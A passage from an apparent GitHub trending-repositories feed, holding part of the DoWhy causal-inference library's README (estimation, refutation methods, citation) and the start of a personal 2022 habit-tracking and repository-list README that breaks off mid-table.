DoWhy.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;Each analysis starts with a&#xA;building a causal model. The assumptions can be viewed graphically or in terms&#xA;of conditional independence statements. Wherever possible, DoWhy can also&#xA;automatically test for stated assumptions using observed data.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Separation between identification and estimation&lt;/strong&gt; Identification is the causal problem. Estimation is simply a statistical problem.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;DoWhy&#xA;respects this boundary and treats them separately. This focuses the causal&#xA;inference effort on identification, and frees up estimation using any&#xA;available statistical estimator for a target estimand. In addition, multiple&#xA;estimation methods can be used for a single identified_estimand and&#xA;vice-versa.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Automated robustness checks&lt;/strong&gt; What happens when key identifying assumptions may not be satisfied?&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;The most critical, and often skipped, part of causal analysis is checking the&#xA;robustness of an estimate to unverified assumptions. DoWhy makes it easy to&#xA;automatically run sensitivity and robustness checks on the obtained estimate.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Finally, DoWhy is easily extensible, allowing other implementations of the four verbs to co-exist (e.g., we support implementations of the &lt;em&gt;estimation&lt;/em&gt; verb from EconML and CausalML libraries). The four verbs are mutually independent, so their implementations can be combined in any way.&lt;/p&gt; &#xA;&lt;p&gt;Below are more details about the current implementation of each of these verbs.&lt;/p&gt; &#xA;&lt;h1&gt;Four steps of causal inference&lt;/h1&gt; &#xA;&lt;h2&gt;I. Model a causal problem&lt;/h2&gt; &#xA;&lt;p&gt;DoWhy creates an underlying causal graphical model for each problem. This serves to make each causal assumption explicit. This graph need not be complete---you can provide a partial graph, representing prior knowledge about some of the variables. DoWhy automatically considers the rest of the variables as potential confounders.&lt;/p&gt; &#xA;&lt;p&gt;Currently, DoWhy supports two formats for graph input: &lt;code&gt;gml &amp;lt;https://github.com/GunterMueller/UNI_PASSAU_FMI_Graph_Drawing&amp;gt;&lt;/code&gt;_ (preferred) and &lt;code&gt;dot &amp;lt;http://www.graphviz.org/documentation/&amp;gt;&lt;/code&gt;_. We strongly suggest to use gml as the input format, as it works well with networkx. You can provide the graph either as a .gml file or as a string. If you prefer to use dot format, you will need to install additional packages (pydot or pygraphviz, see the installation section above). Both .dot files and string format are supported.&lt;/p&gt; &#xA;&lt;p&gt;While not recommended, you can also specify common causes and/or instruments directly instead of providing a graph.&lt;/p&gt; &#xA;&lt;p&gt;Supported formats for specifying causal assumptions&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;&#xA;* **Graph**: Provide a causal graph in either gml or dot format. Can be a text file&#xA;  or a string.&#xA;* **Named variable sets**: Instead of the graph, provide variable names that&#xA;  correspond to relevant categories, such as common causes, instrumental variables, effect&#xA;  modifiers, frontdoor variables, etc.&#xA;&#xA;Examples of how to instantiate a causal model are in the `Getting Started&#xA;&amp;lt;https://github.com/microsoft/dowhy/blob/master/docs/source/example_notebooks/dowhy_simple_example.ipynb&amp;gt;`_&#xA;notebook.&#xA;&#xA;.. i comment image:: causal_model.png&#xA;&#xA;II. Identify a target estimand under the model&#xA;----------------------------------------------&#xA;&#xA;Based on the causal graph, DoWhy finds all possible ways of identifying a desired causal effect based on&#xA;the graphical model. It uses graph-based criteria and do-calculus to find&#xA;potential ways find expressions that can identify the causal effect. &#xA;&#xA;Supported identification criteria&#xA;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~&#xA;&#xA;* Back-door criterion&#xA;* Front-door criterion&#xA;* Instrumental Variables&#xA;* Mediation (Direct and indirect effect identification)&#xA;&#xA;Different notebooks illustrate how to use these identification criteria. Check&#xA;out the `Simple Backdoor &amp;lt;https://github.com/microsoft/dowhy/blob/master/docs/source/example_notebooks/dowhy_confounder_example.ipynb&amp;gt;`_ notebook for the back-door criterion, and the `Simple IV &amp;lt;https://github.com/microsoft/dowhy/blob/master/docs/source/example_notebooks/dowhy-simple-iv-example.ipynb&amp;gt;`_ notebook for the instrumental variable criterion.&#xA;&#xA;III. Estimate causal effect based on the identified estimand&#xA;------------------------------------------------------------&#xA;&#xA;DoWhy supports methods based on both back-door criterion and instrumental&#xA;variables. It also provides a non-parametric confidence intervals and a permutation test for testing&#xA;the statistical significance of obtained estimate. &#xA;&#xA;Supported estimation methods &#xA;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~&#xA;&#xA;* Methods based on estimating the treatment assignment&#xA;    * Propensity-based Stratification&#xA;    * Propensity Score Matching&#xA;    * Inverse Propensity Weighting&#xA;&#xA;* Methods based on estimating the outcome model&#xA;    * Linear Regression&#xA;    * Generalized Linear Models&#xA;&#xA;* Methods based on the instrumental variable equation&#xA;    * Binary Instrument/Wald Estimator&#xA;    * Two-stage least squares&#xA;    * Regression discontinuity&#xA;&#xA;* Methods for front-door criterion and general mediation&#xA;    * Two-stage linear regression&#xA;&#xA;Examples of using these methods are in the `Estimation methods&#xA;&amp;lt;https://github.com/microsoft/dowhy/blob/master/docs/source/example_notebooks/dowhy_estimation_methods.ipynb&amp;gt;`_&#xA;notebook. &#xA;&#xA;Using EconML and CausalML estimation methods in DoWhy&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;It is easy to call external estimation methods using DoWhy. Currently we support integrations with the &lt;code&gt;EconML &amp;lt;https://github.com/microsoft/econml&amp;gt;&lt;/code&gt;_ and &lt;code&gt;CausalML &amp;lt;https://github.com/uber/causalml&amp;gt;&lt;/code&gt;_ packages. Here&#39;s an example of estimating conditional treatment effects using EconML&#39;s double machine learning estimator.&lt;/p&gt; &#xA;&lt;p&gt;.. code:: python&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;from sklearn.preprocessing import PolynomialFeatures&#xA;from sklearn.linear_model import LassoCV&#xA;from sklearn.ensemble import GradientBoostingRegressor&#xA;dml_estimate = model.estimate_effect(identified_estimand, method_name=&#34;backdoor.econml.dml.DML&#34;,&#xA;                    control_value = 0,&#xA;                    treatment_value = 1,&#xA;                    target_units = lambda df: df[&#34;X0&#34;]&amp;gt;1,&#xA;                    confidence_intervals=False,&#xA;                    method_params={&#xA;                        &#34;init_params&#34;:{&#39;model_y&#39;:GradientBoostingRegressor(),&#xA;                                       &#39;model_t&#39;: GradientBoostingRegressor(),&#xA;                                       &#39;model_final&#39;:LassoCV(), &#xA;                                       &#39;featurizer&#39;:PolynomialFeatures(degree=1, include_bias=True)},&#xA;                        &#34;fit_params&#34;:{}}&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;More examples are in the &lt;code&gt;Conditional Treatment Effects with DoWhy &amp;lt;https://github.com/microsoft/dowhy/blob/master/docs/source/example_notebooks/dowhy-conditional-treatment-effects.ipynb&amp;gt;&lt;/code&gt;_ notebook.&lt;/p&gt; &#xA;&lt;h2&gt;IV. Refute the obtained estimate&lt;/h2&gt; &#xA;&lt;p&gt;Having access to multiple refutation methods to validate an effect estimate from a causal estimator is a key benefit of using DoWhy.&lt;/p&gt; &#xA;&lt;p&gt;Supported refutation methods&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;&#xA;* **Add Random Common Cause**: Does the estimation method change its estimate after&#xA;  we add an independent random variable as a common cause to the dataset?&#xA;  (*Hint: It should not*)&#xA;* **Placebo Treatment**: What happens to the estimated causal effect when we&#xA;  replace the true treatment variable with an independent random variable?&#xA;  (*Hint: the effect should go to zero*)&#xA;* **Dummy Outcome**: What happens to the estimated causal effect when we replace&#xA;  the true outcome variable with an independent random variable? (*Hint: The&#xA;  effect should go to zero*)&#xA;* **Simulated Outcome**: What happens to the estimated causal effect when we&#xA;  replace the dataset with a simulated dataset based on a known data-generating&#xA;  process closest to the given dataset? (*Hint: It should match the effect parameter&#xA;  from the data-generating process*)&#xA;* **Add Unobserved Common Causes**: How sensitive is the effect estimate when we&#xA;  add an additional common cause (confounder) to the dataset that is correlated&#xA;  with the treatment and the outcome? (*Hint: It should not be too sensitive*)&#xA;* **Data Subsets Validation**: Does the estimated effect change significantly when&#xA;  we replace the given dataset with a randomly selected subset? (*Hint: It&#xA;  should not*)&#xA;* **Bootstrap Validation**: Does the estimated effect change significantly when we &#xA;  replace the given dataset with bootstrapped samples from the same dataset? (*Hint: It should not*)&#xA;&#xA;Examples of using refutation methods are in the `Refutations &amp;lt;https://github.com/microsoft/dowhy/blob/master/docs/source/example_notebooks/dowhy_refuter_notebook.ipynb&amp;gt;`_ notebook. For an advanced refutation that uses a simulated dataset based on user-provided or learnt data-generating processes, check out the `Dummy Outcome Refuter &amp;lt;https://github.com/microsoft/dowhy/blob/master/docs/source/example_notebooks/dowhy_demo_dummy_outcome_refuter.ipynb&amp;gt;`_ notebook. &#xA;As a practical example, `this notebook &amp;lt;https://github.com/microsoft/dowhy/blob/master/docs/source/example_notebooks/dowhy_refutation_testing.ipynb&amp;gt;`_ shows an application of refutation methods on evaluating effect estimators for the Infant Health and Development Program (IHDP) and Lalonde datasets. &#xA;&#xA;Citing this package&#xA;====================&#xA;If you find DoWhy useful for your research work, please cite us as follows:&#xA;&#xA;Amit Sharma, Emre Kiciman, et al. DoWhy: A Python package for causal inference. 2019. https://github.com/microsoft/dowhy&#xA;&#xA;Bibtex::&#xA;&#xA;  @misc{dowhy,&#xA;  author={Sharma, Amit and Kiciman, Emre and others},&#xA;  title={Do{W}hy: {A Python package for causal inference}},&#xA;  howpublished={https://github.com/microsoft/dowhy},&#xA;  year={2019}&#xA;  }&#xA;&#xA;Alternatively, you can cite our Arxiv paper on DoWhy. &#xA;&#xA;Amit Sharma, Emre Kiciman. DoWhy: An End-to-End Library for Causal Inference. 2020. https://arxiv.org/abs/2011.04216&#xA;&#xA;Bibtex::&#xA;&#xA;  @article{dowhypaper,&#xA;  title={DoWhy: An End-to-End Library for Causal Inference},&#xA;  author={Sharma, Amit and Kiciman, Emre},&#xA;  journal={arXiv preprint arXiv:2011.04216},&#xA;  year={2020}&#xA;  }&#xA;&#xA;Roadmap &#xA;=======&#xA;The `projects &amp;lt;https://github.com/microsoft/dowhy/projects&amp;gt;`_ page lists the next steps for DoWhy. If you would like to contribute, have a look at the current projects. If you have a specific request for DoWhy, please `raise an issue &amp;lt;https://github.com/microsoft/dowhy/issues&amp;gt;`_.&#xA;&#xA;Contributing&#xA;============&#xA;&#xA;This project welcomes contributions and suggestions. For a guide to contributing and a list of all contributors, check out `CONTRIBUTING.md &amp;lt;https://github.com/microsoft/dowhy/blob/master/CONTRIBUTING.md&amp;gt;`_. Our contributor code of conduct is available [here](https://github.com/py-why/governance/blob/main/CODE-OF-CONDUCT.md). You can also join the DoWhy development channel on Discord: |discord|_&#xA;&#xA;.. |discord| image:: https://img.shields.io/discord/818456847551168542&#xA;.. _discord: https://discord.gg/cSBGb3vsZb&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt;</summary>
  </entry>
  <entry>
    <title>yihong0618/2022</title>
    <updated>2022-06-02T01:32:44Z</updated>
    <id>tag:github.com,2022-06-02:/yihong0618/2022</id>
    <link href="https://github.com/yihong0618/2022" rel="alternate"></link>
    <summary type="html">&lt;p&gt;2022 gogogo&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;2022&lt;/h1&gt; &#xA;&lt;p&gt;关于我的 2022 的一些记录。命由天，事在人为，尽力而后已。&lt;/p&gt; &#xA;&lt;h2&gt;我的数字&lt;/h2&gt; &#xA;&lt;!--START_SECTION:my_number--&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Name&lt;/th&gt; &#xA;   &lt;th&gt;Status&lt;/th&gt; &#xA;   &lt;th&gt;Streak&lt;/th&gt; &#xA;   &lt;th&gt;Today?&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;&#34;&gt;词场&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;352 (天)&lt;/td&gt; &#xA;   &lt;td&gt;3&lt;/td&gt; &#xA;   &lt;td&gt;NO&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;&#34;&gt;番茄&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;82 (个)&lt;/td&gt; &#xA;   &lt;td&gt;0&lt;/td&gt; &#xA;   &lt;td&gt;NO&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/yihong0618/2022/issues/2&#34;&gt;俯卧撑&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;1512 (个)&lt;/td&gt; &#xA;   &lt;td&gt;0&lt;/td&gt; &#xA;   &lt;td&gt;NO&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/yihong0618/2022/issues/11&#34;&gt;深蹲&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;225 (个)&lt;/td&gt; &#xA;   &lt;td&gt;0&lt;/td&gt; &#xA;   &lt;td&gt;NO&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/yihong0618/2022/issues/6&#34;&gt;GTD&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;44 (个)&lt;/td&gt; &#xA;   &lt;td&gt;0&lt;/td&gt; &#xA;   &lt;td&gt;NO&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/yihong0618/2022/issues/5&#34;&gt;周记&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;22 (周)&lt;/td&gt; &#xA;   &lt;td&gt;0&lt;/td&gt; &#xA;   &lt;td&gt;NO&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/yihong0618/2022/issues/1&#34;&gt;早起&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;45 (天)&lt;/td&gt; &#xA;   &lt;td&gt;0&lt;/td&gt; &#xA;   &lt;td&gt;NO&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;!--END_SECTION:my_number--&gt; &#xA;&lt;h2&gt;跑步&lt;/h2&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/yihong0618/run/raw/master/assets/github_2022.svg?sanitize=true&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;我的 GitHub&lt;/h2&gt; &#xA;&lt;img align=&#34;middle&#34; src=&#34;https://github-readme-stats-1.yihong0618.vercel.app/api?username=yihong0618&amp;amp;show_icons=true&amp;amp;&amp;amp;&amp;amp;hide_title=true&amp;amp;theme=radical&#34;&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/yihong0618/GitHubPoster/main/examples/github.svg?sanitize=true&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;!--START_SECTION:my_github--&gt; &#xA;&lt;h2&gt;The repos I created&lt;/h2&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;ID&lt;/th&gt; &#xA;   &lt;th&gt;REPO&lt;/th&gt; &#xA;   &lt;th&gt;START&lt;/th&gt; &#xA;   &lt;th&gt;UPDATE&lt;/th&gt; &#xA;   &lt;th&gt;LAUGUAGE&lt;/th&gt; &#xA;   &lt;th&gt;STARS&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;1&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/yihong0618/running_page&#34;&gt;running_page&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;2020-09-17&lt;/td&gt; &#xA;   &lt;td&gt;2022-06-01&lt;/td&gt; &#xA;   &lt;td&gt;Python&lt;/td&gt; &#xA;   &lt;td&gt;1825&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;2&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/yihong0618/GitHubPoster&#34;&gt;GitHubPoster&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;2021-04-21&lt;/td&gt; &#xA;   &lt;td&gt;2022-06-01&lt;/td&gt; &#xA;   &lt;td&gt;Python&lt;/td&gt; &#xA;   &lt;td&gt;1061&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;3&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/yihong0618/gitblog&#34;&gt;gitblog&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;2019-07-18&lt;/td&gt; &#xA;   &lt;td&gt;2022-05-31&lt;/td&gt; &#xA;   &lt;td&gt;Python&lt;/td&gt; &#xA;   &lt;td&gt;473&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;4&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/yihong0618/2021&#34;&gt;2021&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;2020-12-21&lt;/td&gt; &#xA;   &lt;td&gt;2022-06-01&lt;/td&gt; &#xA;   &lt;td&gt;Python&lt;/td&gt; &#xA;   &lt;td&gt;250&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;5&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/yihong0618/2022&#34;&gt;2022&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;2022-01-01&lt;/td&gt; &#xA;   &lt;td&gt;2022-06-02&lt;/td&gt; &#xA;   &lt;td&gt;Python&lt;/td&gt; &#xA;   &lt;td&gt;161&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;6&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/yihong0618/2020&#34;&gt;2020&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;2020-01-10&lt;/td&gt; &#xA;   &lt;td&gt;2022-04-05&lt;/td&gt; &#xA;   &lt;td&gt;C&lt;/td&gt; &#xA;   &lt;td&gt;130&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;7&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/yihong0618/iBeats&#34;&gt;iBeats&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;2021-06-11&lt;/td&gt; &#xA;   &lt;td&gt;2022-05-31&lt;/td&gt; &#xA;   &lt;td&gt;Python&lt;/td&gt; &#xA;   &lt;td&gt;114&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;8&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/yihong0618/gaycore&#34;&gt;gaycore&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;2019-02-18&lt;/td&gt; &#xA;   &lt;td&gt;2022-05-29&lt;/td&gt; &#xA;   &lt;td&gt;Python&lt;/td&gt; &#xA;   &lt;td&gt;94&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;9&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/yihong0618/vscode-gcores&#34;&gt;vscode-gcores&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;2020-01-04&lt;/td&gt; &#xA;   &lt;td&gt;2022-05-31&lt;/td&gt; &#xA;   &lt;td&gt;TypeScript&lt;/td&gt; &#xA;   &lt;td&gt;88&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;10&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/yihong0618/github-readme-stats&#34;&gt;github-readme-stats&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;2020-12-24&lt;/td&gt; &#xA;   &lt;td&gt;2022-05-21&lt;/td&gt; &#xA;   &lt;td&gt;Go&lt;/td&gt; &#xA;   &lt;td&gt;87&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;11&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/yihong0618/dalian-IT&#34;&gt;dalian-IT&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;2021-04-07&lt;/td&gt; &#xA;   &lt;td&gt;2022-05-31&lt;/td&gt; &#xA;   &lt;td&gt;md&lt;/td&gt; &#xA;   &lt;td&gt;77&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;12&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/yihong0618/duolingo_remember&#34;&gt;duolingo_remember&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;2021-01-18&lt;/td&gt; &#xA;   &lt;td&gt;2022-04-16&lt;/td&gt; &#xA;   &lt;td&gt;Python&lt;/td&gt; &#xA;   &lt;td&gt;36&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;13&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/yihong0618/shanbay_remember&#34;&gt;shanbay_remember&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;2020-12-02&lt;/td&gt; &#xA;   &lt;td&gt;2022-02-23&lt;/td&gt; &#xA;   &lt;td&gt;JavaScript&lt;/td&gt; &#xA;   &lt;td&gt;35&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;14&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/yihong0618/nbnhhsh-cli&#34;&gt;nbnhhsh-cli&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;2021-07-09&lt;/td&gt; &#xA;   &lt;td&gt;2022-05-17&lt;/td&gt; &#xA;   &lt;td&gt;Python&lt;/td&gt; &#xA;   &lt;td&gt;33&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;15&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/yihong0618/gcores_calendar&#34;&gt;gcores_calendar&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;2020-08-24&lt;/td&gt; &#xA;   &lt;td&gt;2022-05-16&lt;/td&gt; &#xA;   &lt;td&gt;JavaScript&lt;/td&gt; &#xA;   &lt;td&gt;27&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;16&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/yihong0618/pengdu_helper&#34;&gt;pengdu_helper&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;2021-09-09&lt;/td&gt; &#xA;   &lt;td&gt;2022-04-11&lt;/td&gt; &#xA;   &lt;td&gt;Go&lt;/td&gt; &#xA;   &lt;td&gt;25&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;17&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/yihong0618/my_kindle_stats&#34;&gt;my_kindle_stats&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;2021-11-18&lt;/td&gt; &#xA;   &lt;td&gt;2022-04-24&lt;/td&gt; &#xA;   &lt;td&gt;Python&lt;/td&gt; &#xA;   &lt;td&gt;22&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;18&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/yihong0618/running_skyline&#34;&gt;running_skyline&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;2021-03-02&lt;/td&gt; &#xA;   &lt;td&gt;2022-05-10&lt;/td&gt; &#xA;   &lt;td&gt;Python&lt;/td&gt; &#xA;   &lt;td&gt;20&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;19&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/yihong0618/blog&#34;&gt;blog&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;2020-06-22&lt;/td&gt; &#xA;   &lt;td&gt;2022-01-28&lt;/td&gt; &#xA;   &lt;td&gt;JavaScript&lt;/td&gt; &#xA;   &lt;td&gt;14&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;20&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/yihong0618/Runtastic&#34;&gt;Runtastic&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;2020-07-24&lt;/td&gt; &#xA;   &lt;td&gt;2022-04-20&lt;/td&gt; &#xA;   &lt;td&gt;Python&lt;/td&gt; &#xA;   &lt;td&gt;12&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;21&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/yihong0618/yihong0618&#34;&gt;yihong0618&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;2020-07-16&lt;/td&gt; &#xA;   &lt;td&gt;2022-05-30&lt;/td&gt; &#xA;   &lt;td&gt;md&lt;/td&gt; &#xA;   &lt;td&gt;11&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;22&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/yihong0618/github-readme-stats-server&#34;&gt;github-readme-stats-server&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;2021-12-08&lt;/td&gt; &#xA;   &lt;td&gt;2022-04-07&lt;/td&gt; &#xA;   &lt;td&gt;HTML&lt;/td&gt; &#xA;   &lt;td&gt;8&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;23&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/yihong0618/Python365&#34;&gt;Python365&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;2019-09-05&lt;/td&gt; &#xA;   &lt;td&gt;2021-07-09&lt;/td&gt; &#xA;   &lt;td&gt;Python&lt;/td&gt; &#xA;   &lt;td&gt;6&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;24&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/yihong0618/run&#34;&gt;run&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;2021-08-16&lt;/td&gt; &#xA;   &lt;td&gt;2022-01-11&lt;/td&gt; &#xA;   &lt;td&gt;Python&lt;/td&gt; &#xA;   &lt;td&gt;2&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;25&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/yihong0618/github_upstream_script&#34;&gt;github_upstream_script&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;2021-05-08&lt;/td&gt; &#xA;   &lt;td&gt;2022-03-08&lt;/td&gt; &#xA;   &lt;td&gt;Python&lt;/td&gt; &#xA;   &lt;td&gt;2&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;26&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/yihong0618/edocteel001&#34;&gt;edocteel001&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;2019-11-12&lt;/td&gt; &#xA;   &lt;td&gt;2020-05-18&lt;/td&gt; &#xA;   &lt;td&gt;JavaScript&lt;/td&gt; &#xA;   &lt;td&gt;1&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;27&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/yihong0618/gaycore-server&#34;&gt;gaycore-server&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;2019-02-18&lt;/td&gt; &#xA;   &lt;td&gt;2020-11-02&lt;/td&gt; &#xA;   &lt;td&gt;Go&lt;/td&gt; &#xA;   &lt;td&gt;0&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;28&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a 